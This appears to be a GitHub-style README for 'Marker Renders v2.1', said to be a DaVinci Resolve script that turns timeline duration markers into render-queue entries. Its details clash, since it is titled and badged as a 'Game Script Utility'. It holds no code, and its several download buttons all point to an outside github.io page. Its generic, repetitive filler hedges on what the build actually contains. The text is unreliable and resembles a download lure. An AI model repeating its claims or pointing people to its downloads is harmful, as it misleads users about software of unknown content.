# Marker Renders v2.1 - Game Script Utility 2026

> **DaVinci Resolve timeline marker automation.** Marker Renders reads duration markers from DaVinci Resolve timelines and converts them into queued items in seconds, making render preparation faster and more consistent.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-DaVinci%20Resolve-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevincooper76/marker-renders-script-utility?style=flat-square)](https://github.com/kevincooper76/marker-renders-script-utility)

---

<p align="center">
  <a href="https://kevincooper76.github.io/marker-renders-script-utility/">
    <img src="https://img.shields.io/badge/Download-Marker%20Renders%20Script-brightgreen?style=for-the-badge" alt="Download Marker Renders Script">
  </a>
</p>

> **[Direct Download - Marker Renders](https://kevincooper76.github.io/marker-renders-script-utility/)**

---

[Download Latest Build](https://kevincooper76.github.io/marker-renders-script-utility/)

---

## What It Does

Marker Renders is a DaVinci Resolve script focused on timeline marker workflows. It scans the active timeline for duration markers, then turns those marker ranges into queued entries measured in seconds. That makes it easier to move from marker planning to render queue setup without a lot of manual handling.

This release is intentionally narrow in scope. Instead of offering broad editing controls, it is designed for users who structure projects around markers and want a quicker path from timeline organization to render preparation.

## Script Features

- Finds duration markers on DaVinci Resolve timelines
- Queues marker-based items automatically in seconds
- Built specifically for DaVinci Resolve timeline workflows
- Cuts down on manual queue setup for marker-based rendering
- Well suited to projects that divide work with timeline markers
- Designed to automate repeated render preparation tasks
- Lightweight script utility with a focused, task-oriented purpose

## Setup

1. Download the latest build using the link above.
2. Put the script into the DaVinci Resolve script or utility folder you prefer.
3. Start DaVinci Resolve and launch the script from your normal script access point.
4. Confirm that your timeline already includes duration markers before you begin queueing.

Example usage flow:

- Add duration markers to the timeline
- Launch Marker Renders
- Let the script detect and queue the markers
- Review the queued items before rendering

## Options

Marker Renders keeps its workflow centered on a small number of actions. If your build exposes local settings, use them to control marker collection and queue behavior.

| Setting | Purpose |
| --- | --- |
| Timeline scan | Finds duration markers in the active timeline |
| Queue mode | Converts marker segments into queued render entries |
| Time unit | Uses seconds for queued marker durations |
| Resolve timeline support | Limits processing to DaVinci Resolve timelines |

## Compatibility

Marker Renders is meant for DaVinci Resolve timelines and marker-driven render workflows. It requires duration markers in the active timeline, so timelines without those markers will not generate the same queue output.

Results can differ based on your DaVinci Resolve version, the structure of the timeline, and the way markers are set up in the project. For reliable output, keep marker timing and duration information consistent before running the script.

## FAQ

### How do I get started?
Download the build, place it where DaVinci Resolve can reach your scripts, and run it on a timeline that already contains duration markers.

### Will it do anything if there are no markers?
No meaningful queue output should be expected if the current timeline does not contain duration markers.

### Can the queue behavior be adjusted?
If your local copy includes configurable values or settings, you can change them there. Otherwise, the script follows its default marker-to-queue process.

### Is this limited to one Resolve version?
It is intended for DaVinci Resolve timelines in general, although the exact behavior can still vary with version differences and project structure.

### Where do the queued items go?
They are processed through the script's render-queue workflow inside DaVinci Resolve using the active timeline's marker data.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
